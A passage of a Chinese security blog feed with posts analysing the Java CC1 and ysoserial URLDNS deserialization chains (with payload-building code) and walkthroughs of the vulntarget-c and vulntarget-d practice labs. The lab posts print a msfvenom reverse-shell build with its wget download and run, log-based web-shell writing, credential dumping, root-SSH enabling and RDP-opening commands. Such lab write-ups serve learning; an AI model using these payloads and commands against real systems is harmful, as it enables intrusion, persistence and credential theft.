AnnotationInvocationHandler.readObject()<span class="comment">//转到AnnotationInvocationHandler对象的readObject()方法</span></span><br><span class="line">            Map(Proxy).entrySet()<span class="comment">//用于触发代理类对象的invoke()</span></span><br><span class="line">                AnnotationInvocationHandler.invoke()</span><br><span class="line">                    LazyMap.get()<span class="comment">//用于触发memberValues.get(member)</span></span><br><span class="line">                        ChainedTransformer.transform()<span class="comment">//层级调用进行命令执行</span></span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220510170521661.png" alt="image-20220510170521661"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/sectool/320360.html">https://www.freebuf.com/sectool/320360.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/349838623">https://zhuanlan.zhihu.com/p/349838623</a></p><p><a href="https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1no4y1U7E1?spm_id_from=333.337.search-card.all.click</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;第一次分析cc链看了好几天，Java基础也不太好真的看吐了，基本所有知识都是从头开始学，感谢大哥支持解惑&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;什么是cc1&quot;&gt;&lt;a href=&quot;#什么是cc1&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>从0解析 ysoserial URLDNS链</title>
    <link href="https://polosec.github.io/2022/05/07/%E4%BB%8E0%E8%A7%A3%E6%9E%90-ysoserial-URLDNS%E9%93%BE/"/>
    <id>https://polosec.github.io/2022/05/07/%E4%BB%8E0%E8%A7%A3%E6%9E%90-ysoserial-URLDNS%E9%93%BE/</id>
    <published>2022-05-07T15:52:55.000Z</published>
    <updated>2022-07-26T03:36:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是ysoserial"><a href="#什么是ysoserial" class="headerlink" title="什么是ysoserial"></a>什么是ysoserial</h1><p>ysoserial是一款Java反序列化利用工具，可以理解为payload生成器，而Java反序列化中的payload通常是一条利用链，叫做gadget chain，这就和PHP 反序列化构造利用链是类似的道理，如果了解过PHP 反序列化的话相信不是太难理解利用链的概念，再抽象一点，就像在Flask+jinja2模板注入中，通过变量到基类，然后从基类到子类一步一步找到执行系统命令/文件读取的函数，这也算得上是一种利用链。</p><p>ysoserial地址：<a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a> （salute!</p><p>在ysoserial根据组件或者环境不同内置了数条利用链，其中urldns这条利用链使用的组件是Java原生的类与方法，应该适用于所有情况。</p><p>urldns链生成的payload执行后会产生一个dns query，如果在dnslog平台看到了该请求则可以认为存在Java反序列化漏洞。</p><h1 id="部分Java基础知识"><a href="#部分Java基础知识" class="headerlink" title="部分Java基础知识"></a>部分Java基础知识</h1><p>在讲具体代码之前还需要说一下部分用到的Java知识</p><h2 id="URLStreamHandler类"><a href="#URLStreamHandler类" class="headerlink" title="URLStreamHandler类"></a>URLStreamHandler类</h2><p>抽象类URLStreamHandler是所有流协议处理程序的通用父类。<strong>流协议处理程序知道如何为特定协议类型（如http、ftp或gopher）建立连接</strong>。<br>在大多数情况下，URLStreamHandler子类的实例不是由应用程序直接创建的。相反，在构造URL时第一次遇到协议名时，会自动加载相应的流协议处理程序。</p><h2 id="URL类"><a href="#URL类" class="headerlink" title="URL类"></a>URL类</h2><p><img src="http://cdn.polowong.top/image-20220507223626277.png" alt="image-20220507223626277"></p><p>可以理解为通过url类把一个字符串url处理成Java可以理解的url格式。</p><h2 id="HashMap类"><a href="#HashMap类" class="headerlink" title="HashMap类"></a>HashMap类</h2><p>Java中的Map是一个接口，不能实例化Map类，而是使用implemented Map的类，如hashmap，treemap。</p><p>map是key-value键值对，其中key是不可重复的，hashmap使用哈希算法对key去重，效率更高。</p><h3 id="hashmap-put"><a href="#hashmap-put" class="headerlink" title="hashmap.put()"></a>hashmap.put()</h3><p>hashmap.put()方法将一个k,v(key,value)放入hashmap实例中。</p><h2 id="Field类"><a href="#Field类" class="headerlink" title="Field类"></a>Field类</h2><p>Field 是一个类，位于 java.lang.reflect 包下。在 java 反射中 Field 类描述的是类的属性，功能包括:</p><ul><li>获取当前对象的成员变量的类型</li><li>对成员变量重新设值</li></ul><h3 id="field-setAccessible-true"><a href="#field-setAccessible-true" class="headerlink" title="field.setAccessible(true)"></a>field.setAccessible(true)</h3><p>正常 set(Object obj, Object value) 时，修改 final 类型的变量会导致 IllegalAccessException。由于 Field 继承自 AccessibleObject，我们可以使用 AccessibleObject.setAccessible() 方法告诉安全机制，这个变量可以访问即可解决，如 field.setAccessible(true)。</p><h4 id="getField"><a href="#getField" class="headerlink" title="getField"></a>getField</h4><ul><li>getField() 方法，获取一个类的 public 成员变量，包括基类</li><li>getDeclaredField() 方法，获取一个类的 所有成员变量，不包括基类</li></ul><h3 id="set"><a href="#set" class="headerlink" title="set()"></a>set()</h3><p>Field类的set方法其实就有点反射的意思了，首先需要通过getDeclaredField方法获取某个属性，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field hashcode&#x3D;u.getClass().getDeclaredField(&quot;hashCode&quot;);</span><br></pre></td></tr></table></figure><p>然后将hashcode设置为可访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcode.setAccessible(true);</span><br></pre></td></tr></table></figure><p>然后将hashcode的属性值设为某个值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcode.set(u,-1);</span><br></pre></td></tr></table></figure><p>在这个过程中我认为有点<strong>invoke</strong>的感觉，正常设置某个属性的值应该是u.hashcode=-1。</p><p>使用reflection的话，通过**Reflections.setFieldValue(u, “hashCode”, -1);**也可以修改hashcode的值。</p><h1 id="payload生成分析"><a href="#payload生成分析" class="headerlink" title="payload生成分析"></a>payload生成分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNStest</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;</span><br><span class="line">       <span class="comment">/* URLStreamHandler handler= new URLStreamHandler() &#123;</span></span><br><span class="line"><span class="comment">            @Override</span></span><br><span class="line"><span class="comment">            protected URLConnection openConnection(URL u) throws IOException &#123;</span></span><br><span class="line"><span class="comment">                return null;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            protected synchronized InetAddress getHostAddress(URL u) &#123;</span></span><br><span class="line"><span class="comment">                return null;</span></span><br><span class="line"><span class="comment">            &#125;先不管这部分代码，后面会解释</span></span><br><span class="line"><span class="comment">        &#125;;*/</span></span><br><span class="line">        HashMap ht=<span class="keyword">new</span> HashMap();</span><br><span class="line">        String url=<span class="string">&quot;http://test.5.0x4.cc&quot;</span>;</span><br><span class="line">        URL u=<span class="keyword">new</span> URL(<span class="keyword">null</span>,url,handler);</span><br><span class="line">        ht.put(u,url);</span><br><span class="line">        Field hashcode=u.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashcode.set(u,-<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream stream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:\\javaVulnsStu\\ysoserial\\test.data&quot;</span>));</span><br><span class="line">        stream.writeObject(ht);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化生成的payload</span></span><br><span class="line">        ObjectInputStream stream1 = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:\\javaVulnsStu\\ysoserial\\test.data&quot;</span>));</span><br><span class="line">        stream1.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在**ht.put(u,url)<strong>处下断点调试，首先跟到的是</strong>putval()**方法</p><p><img src="http://cdn.polowong.top/image-20220507225735847.png" alt="image-20220507225735847"></p><p>接下来跟到了HashMap.java的<strong>hash()<strong>方法，发现调用了</strong>hashcode()<strong>方法，继续跟进</strong>hashcode()<strong>方法发现到了</strong>URL.JAVA</strong>的hashcode()方法中</p><p><img src="http://cdn.polowong.top/image-20220507230003967.png" alt="image-20220507230003967"></p><p>因为handler是<strong>URLStreamHandler</strong>，所以后面需要调用<strong>URLStreamHandler</strong>类的**hashCode()**方法</p><p><img src="http://cdn.polowong.top/image-20220507230105818.png" alt="image-20220507230105818"></p><p>确实到了<strong>URLStreamHandler</strong>类的**hashCode()<strong>方法中，我们重点关注</strong>getHostAddress()**方法</p><p>发现进入<strong>getHostAddress()<strong>方法后调用了</strong>getHost()<strong>和</strong>getByName()<strong>方法，通过查阅文档，发现</strong>InetAddress.getByName</strong>方法是用来获取主机ip地址的，如果是一个url，则会进行一次dns查询。当前dnslog解析记录为空</p><p><img src="http://cdn.polowong.top/image-20220507230427145.png" alt="image-20220507230427145"></p><p><img src="http://cdn.polowong.top/image-20220507230509531.png" alt="image-20220507230509531"></p><p>执行完这句话之后可以看到了dnslog上收到了解析记录。</p><p><img src="http://cdn.polowong.top/image-20220507230643021.png" alt="image-20220507230643021"></p><p>那么到此为止payload生成就结束了，调用链为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() -&gt;  HashMap.putVal() -&gt; HashMap.hash() </span><br><span class="line">-&gt; URL.hashCode()-&gt;URLStreamHandler.hashCode().getHostAddress</span><br><span class="line">-&gt;URLStreamHandler.hashCode().getHostAddress</span><br><span class="line">-&gt;URLStreamHandler.hashCode().getHostAddress.InetAddress.getByName</span><br></pre></td></tr></table></figure><p>但是在这里只是生成payload，并不希望发送真正的dnslog解析请求，所以需要上面代码注释的部分，重写<strong>URLStreamHandler</strong>的<strong>getHostAddress()<strong>方法，使得exp只生成payload而不发送dnslog解析请求。</strong>我们这一步的目的是生成payload且不发送dns解析请求所以重写了上述方法，而生成payload打过去之后目标服务肯定不会重写这个方法。</strong></p><p>在payload生成完之后通过输出流写到文件中，至此payload生成分析结束。</p><h1 id="payload反序列化调用分析"><a href="#payload反序列化调用分析" class="headerlink" title="payload反序列化调用分析"></a>payload反序列化调用分析</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNStest</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;</span><br><span class="line">        URLStreamHandler handler= <span class="keyword">new</span> URLStreamHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        HashMap ht=<span class="keyword">new</span> HashMap();</span><br><span class="line">        String url=<span class="string">&quot;http://test.5.0x4.cc&quot;</span>;</span><br><span class="line">        URL u=<span class="keyword">new</span> URL(<span class="keyword">null</span>,url,handler);</span><br><span class="line">        ht.put(u,url);</span><br><span class="line">        Field hashcode=u.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashcode.set(u,-<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream stream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;D:\\javaVulnsStu\\ysoserial\\test.data&quot;</span>));</span><br><span class="line">        stream.writeObject(ht);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化生成的payload</span></span><br><span class="line">        ObjectInputStream stream1 = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;D:\\javaVulnsStu\\ysoserial\\test.data&quot;</span>));</span><br><span class="line">        stream1.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>重点看最后两行代码，在Java中使用readobject方法反序列化对象，在hashmap中也下断点调试一下</p><p><img src="http://cdn.polowong.top/image-20220507234049673.png" alt="image-20220507234049673"></p><p>在跟到putval的时候，<img src="http://cdn.polowong.top/image-20220507235041745.png" alt="image-20220507235041745"></p><p>发现后面会调用到在**u.hostAddress = InetAddress.getByName(host);**下的断点，跟进去就可以看到下一步就是进行域名解析了</p><p><img src="http://cdn.polowong.top/image-20220507235125482.png" alt="image-20220507235125482"></p><p>后面dnslog平台也受到了解析请求</p><p><img src="http://cdn.polowong.top/image-20220507235155590.png" alt="image-20220507235155590"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://lucifer-rossweisse.github.io/2022/04/10/web%E5%AD%A6%E4%B9%A0/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E9%93%BE%E5%AD%90">https://lucifer-rossweisse.github.io/2022/04/10/web%E5%AD%A6%E4%B9%A0/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E9%93%BE%E5%AD%90</a></p><p><a href="https://cloud.tencent.com/developer/article/1940432">https://cloud.tencent.com/developer/article/1940432</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13772184.html">https://www.cnblogs.com/nice0e3/p/13772184.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是ysoserial&quot;&gt;&lt;a href=&quot;#什么是ysoserial&quot; class=&quot;headerlink&quot; title=&quot;什么是ysoserial&quot;&gt;&lt;/a&gt;什么是ysoserial&lt;/h1&gt;&lt;p&gt;ysoserial是一款Java反序列化利用工具，可以理解为</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>vulntarget-d WriteUp</title>
    <link href="https://polosec.github.io/2022/04/14/vulntarget-d-WriteUp/"/>
    <id>https://polosec.github.io/2022/04/14/vulntarget-d-WriteUp/</id>
    <published>2022-04-14T14:53:01.000Z</published>
    <updated>2022-04-14T14:53:01.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>192.168.255.134</p><p>nmap先扫一下</p><p><img src="http://cdn.polowong.top/image-20220408142157879.png" alt="image-20220408142157879"></p><p>尝试访问80与81端口，结果只有81端口可以访问，是骑士cms <a href="http://www.74cms.com/">74cms</a> v6.0.20</p><p><img src="http://cdn.polowong.top/image-20220408142249768.png" alt="image-20220408142249768"></p><p>查看版本，找一下公开漏洞。这cms好熟悉 之前肯定打过</p><p><a href="https://www.cnblogs.com/twlr/p/14142870.html">https://www.cnblogs.com/twlr/p/14142870.html</a></p><p>直接getshell</p><p><img src="http://cdn.polowong.top/image-20220408162753802.png" alt="image-20220408162753802"></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p><img src="http://cdn.polowong.top/image-20220408163151671.png" alt="image-20220408163151671"></p><p>64位Ubuntu www用户，双网卡 192.168.68.0/24 192.168.255.0/24,发现主机255.254</p><p>先上msf，开socks代理，然后尝试提权</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linux_exploit_suggester</p><p><img src="http://cdn.polowong.top/image-20220408164213319.png" alt="image-20220408164213319"></p><p>CVE-2021-4034</p><p><img src="http://cdn.polowong.top/image-20220408164826666.png" alt="image-20220408164826666"></p><p>然后拿root权限改下密码</p><p><img src="http://cdn.polowong.top/image-20220408164958353.png" alt="image-20220408164958353"></p><p>服务器没装openssh server，由于通外网直接给他装一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#39;&#x2F;PermitRootLogin &#x2F;c PermitRootLogin yes&#39; &#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br></pre></td></tr></table></figure><p>激活root远程登陆并且上线msf</p><p><img src="http://cdn.polowong.top/image-20220408174843881.png" alt="image-20220408174843881"></p><p><img src="http://cdn.polowong.top/image-20220408175127564.png" alt="image-20220408175127564"></p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>上传fscan搜集一波</p><p>搜集完发现Windows主机68.129，80端口hello world，dirsearch扫一下发现phpmyadmin</p><p><a href="http://192.168.68.129/phpmyadmin/">http://192.168.68.129/phpmyadmin/</a></p><h1 id="内网主机1"><a href="#内网主机1" class="headerlink" title="内网主机1"></a>内网主机1</h1><p><a href="http://192.168.68.129/phpmyadmin/">http://192.168.68.129/phpmyadmin/</a></p><p>弱口令root/root上去，尝试getshell。</p><p><img src="http://cdn.polowong.top/image-20220408180521583.png" alt="image-20220408180521583"></p><p>secure_file_priv为NULL，无法直接写文件getshell，尝试日志getshell</p><h2 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h2><p><img src="http://cdn.polowong.top/image-20220408180714878.png" alt="image-20220408180714878"></p><p> set global general_log = “ON”;</p><p>还差一个绝对路径，正好泄露了phpinfo</p><p><img src="http://cdn.polowong.top/image-20220408180901158.png" alt="image-20220408180901158"></p><p>修改日志文件</p><p>set global general_log_file = “C:/phpstudy/PHPTutorial/WWW/shell.php”;</p><p><img src="http://cdn.polowong.top/image-20220408181105913.png" alt="image-20220408181105913"></p><p><img src="http://cdn.polowong.top/image-20220408181139916.png" alt="image-20220408181139916"></p><p>上蚁剑,msf自带socks代理麻了，还是gost吧</p><p>kali：</p><p><img src="http://cdn.polowong.top/image-20220408183704680.png" alt="image-20220408183704680"></p><p>ubuntu：</p><p><img src="http://cdn.polowong.top/image-20220408183728114.png" alt="image-20220408183728114"></p><p>还是先上线msf，gost多层转发</p><h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><p>思路如下：内网主机1连接外网主机5001端口，外网主机监听5001 转发到kali5001，kali msf监听5001</p><p>外网主机：./gost-linux-amd64 -L=:5001/192.168.255.132:5001</p><p><img src="http://cdn.polowong.top/image-20220408184043982.png" alt="image-20220408184043982"></p><p>有火绒，生成shellcode先免杀</p><p><img src="http://cdn.polowong.top/image-20220408184756569.png" alt="image-20220408184756569"></p><h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>msf getsystem直接得到system权限,当前不在域环境，不考虑域渗透。</p><h2 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h2><p>load kiwi </p><p>creds_all</p><p>crow      WIN-D4S86JO2R26  209c6174da490caeb422f3fa5a7ae634  7c87541fd3f3ef5016e12d411900c87a6046a8e8</p><p>解密得到密码admin</p><h2 id="开启3389"><a href="#开启3389" class="headerlink" title="开启3389"></a>开启3389</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v UserAuthentication &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line">最后一句话解决mstsc报错问题</span><br></pre></td></tr></table></figure><p>开完3389系统崩了 懒得再弄一次了 草。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a&gt;外网打点&lt;/h1&gt;&lt;p&gt;192.168.255.134&lt;/p&gt;
&lt;p&gt;nmap先扫一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://cdn.po</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulntarget-c WriteUp</title>
    <link href="https://polosec.github.io/2022/04/05/Vulntarget-c-WriteUp/"/>
    <id>https://polosec.github.io/2022/04/05/Vulntarget-c-WriteUp/</id>
    <published>2022-04-04T16:00:15.000Z</published>
    <updated>2022-04-04T16:00:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p><a href="http://192.168.255.133/">http://192.168.255.133/</a></p><p>nmap扫描之后发现22端口和80端口，尝试对22端口进行爆破失败，于是考虑对80端口渗透。</p><p>打开看到是laravel，开启xray扫一下，扫到了CVE-2021-3129，尝试利用</p><p><img src="http://cdn.polowong.top/image-20220404172801341.png" alt="image-20220404172801341"></p><p><a href="https://github.com/ambionics/phpggc">https://github.com/ambionics/phpggc</a></p><p><a href="https://github.com/SNCKER/CVE-2021-3129">https://github.com/SNCKER/CVE-2021-3129</a></p><p>目录结构如下</p><p><img src="http://cdn.polowong.top/image-20220404174230224.png" alt="image-20220404174230224"></p><p>修改main里面代码获得一个shell</p><p><img src="http://cdn.polowong.top/image-20220404174209350.png" alt="image-20220404174209350"></p><h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><p>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.255.132 LPORT=4444 -f elf -o 1.elf</p><p>kali：python3 -m http.server 80</p><p>受害机：wget <a href="http://192.168.255.132/1.elf">http://192.168.255.132/1.elf</a> -O /tmp/1.elf</p><p>chmod u+x /tmp/1.elf</p><p>/tmp/1.elf</p><p> msf: run post/multi/manage/autoroute</p><p><img src="http://cdn.polowong.top/image-20220404175228121.png" alt="image-20220404175228121"></p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>上传fscan、看arp收集内网主机信息，查看arp表发现10.0.20.100主机，开个socks代理上去，可以看到10.0.20.100跑了web服务，先放这里不管了。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>当前是www-data用户，权限较低，尝试使用exploit suggester等方法失败后，发现home目录下存在vulntarget用户，弱口令root上去，sudo -l，可以看到当前用户是有root权限的</p><p>直接以当前用户sudo elf文件：</p><p><img src="http://cdn.polowong.top/image-20220404181415810.png" alt="image-20220404181415810"></p><p>sudo passwd root 直接改掉root密码即可获取root权限</p><h1 id="内网主机1"><a href="#内网主机1" class="headerlink" title="内网主机1"></a>内网主机1</h1><p><a href="http://10.0.20.100/">http://10.0.20.100/</a></p><p><img src="http://cdn.polowong.top/image-20220404181538594.png" alt="image-20220404181538594"></p><p>Windows php8</p><p><a href="http://10.0.20.100/admin/">http://10.0.20.100/admin/</a></p><p>admin admin123弱口令上去，首先找上传，模板修改点，没找到。    </p><p>搜到了一个sql注入，但是msf的代理不太稳定，传一个gost开socks代理</p><p>受害跳板：gost -L=:5001/192.168.255.132:5000</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;admin&#x2F;inquiries&#x2F;view_details.php?id&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 10.0.20.100</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko&#x2F;20100101 Firefox&#x2F;95.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.0.20.100&#x2F;admin&#x2F;?page&#x3D;inquiries</span><br><span class="line">Cookie: PHPSESSID&#x3D;ndd4l701jdk2un19ijjhufgc39GET &#x2F;admin&#x2F;inquiries&#x2F;view_details.php?id&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 10.0.20.100</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko&#x2F;20100101 Firefox&#x2F;95.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;10.0.20.100&#x2F;admin&#x2F;?page&#x3D;inquiries</span><br><span class="line">Cookie: PHPSESSID&#x3D;ndd4l701jdk2un19ijjhufgc39</span><br></pre></td></tr></table></figure><p>python3 sqlmap.py -u 